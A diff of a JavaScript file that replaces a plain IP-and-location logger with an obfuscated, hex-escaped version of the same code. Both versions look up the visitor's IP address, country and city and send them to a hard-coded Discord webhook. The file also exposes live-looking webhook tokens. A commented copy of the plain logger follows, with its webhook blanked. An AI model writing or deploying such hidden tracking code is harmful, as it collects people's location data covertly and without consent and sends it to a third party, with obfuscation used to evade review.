@@ -1,28 +1,34 @@
 // Hehe 0w0 ... Dont spam me pls :D
-fetch("https://api.db-ip.com/v2/free/self").then(res => res.json()).then(json => {
-    var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/932002879559057488/iWTSfZ-YRrRIJtVez61HOAPxsw-rQyGwgZ8lyAulXVLp1NR7PqPxUaNQN885HV0vcGrJ");
-    request.setRequestHeader('Content-type', 'application/json');
-    request.send(JSON.stringify({
-        "embeds": [
-            {
-                "title": "New One",
-                "color": 8542719,
-                "fields": [
-                    {
-                        "name": "IP",
-                        "value": json.ipAddress
-                    },
-                    {
-                        "name": "Country",
-                        "value": json.countryName
-                    },
-                    {
-                        "name": "City",
-                        "value": json.city
-                    },
-                ]
-            }
-        ]
-    }));
-})
+var _0xe3ea=["\x50\x4F\x53\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x39\x33\x32\x32\x37\x32\x33\x32\x38\x30\x35\x32\x37\x33\x32\x30\x32\x34\x2F\x76\x4D\x32\x4F\x57\x6E\x58\x62\x59\x41\x47\x59\x36\x36\x6A\x77\x63\x63\x5A\x73\x42\x44\x71\x45\x5A\x45\x41\x42\x36\x43\x75\x66\x6A\x5A\x64\x35\x4C\x39\x32\x6B\x36\x45\x6D\x71\x68\x35\x6E\x35\x50\x34\x69\x58\x70\x67\x6B\x48\x5F\x31\x47\x66\x56\x42\x52\x4D\x61\x4B\x78\x47","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x4E\x65\x77\x20\x4F\x6E\x65","\x49\x50","\x69\x70\x41\x64\x64\x72\x65\x73\x73","\x43\x6F\x75\x6E\x74\x72\x79","\x63\x6F\x75\x6E\x74\x72\x79\x4E\x61\x6D\x65","\x43\x69\x74\x79","\x63\x69\x74\x79","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x73\x65\x6E\x64","\x74\x68\x65\x6E","\x6A\x73\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x64\x62\x2D\x69\x70\x2E\x63\x6F\x6D\x2F\x76\x32\x2F\x66\x72\x65\x65\x2F\x73\x65\x6C\x66"];fetch(_0xe3ea[17])[_0xe3ea[15]]((_0x2d74x3)=>{return _0x2d74x3[_0xe3ea[16]]()})[_0xe3ea[15]]((_0x2d74x1)=>{var _0x2d74x2= new XMLHttpRequest();_0x2d74x2[_0xe3ea[2]](_0xe3ea[0],_0xe3ea[1]);_0x2d74x2[_0xe3ea[5]](_0xe3ea[3],_0xe3ea[4]);_0x2d74x2[_0xe3ea[14]](JSON[_0xe3ea[13]]({"\x65\x6D\x62\x65\x64\x73":[{"\x74\x69\x74\x6C\x65":_0xe3ea[6],"\x63\x6F\x6C\x6F\x72":8542719,"\x66\x69\x65\x6C\x64\x73":[{"\x6E\x61\x6D\x65":_0xe3ea[7],"\x76\x61\x6C\x75\x65":_0x2d74x1[_0xe3ea[8]]},{"\x6E\x61\x6D\x65":_0xe3ea[9],"\x76\x61\x6C\x75\x65":_0x2d74x1[_0xe3ea[10]]},{"\x6E\x61\x6D\x65":_0xe3ea[11],"\x76\x61\x6C\x75\x65":_0x2d74x1[_0xe3ea[12]]}]}]}))})
+
+
+
+
+// encrypted code 0w0
+// fetch("https://api.db-ip.com/v2/free/self").then(res => res.json()).then(json => {
+//     var request = new XMLHttpRequest();
+//     request.open("POST", "____");
+//     request.setRequestHeader('Content-type', 'application/json');
+//     request.send(JSON.stringify({
+//         "embeds": [
+//             {
+//                 "title": "New One",
+//                 "color": 8542719,
+//                 "fields": [
+//                     {
+//                         "name": "IP",
+//                         "value": json.ipAddress
+//                     },
+//                     {
+//                         "name": "Country",
+//                         "value": json.countryName
+//                     },
+//                     {
+//                         "name": "City",
+//                         "value": json.city
+//                     },
+//                 ]
+//             }
+//         ]
+//     }));
+// })
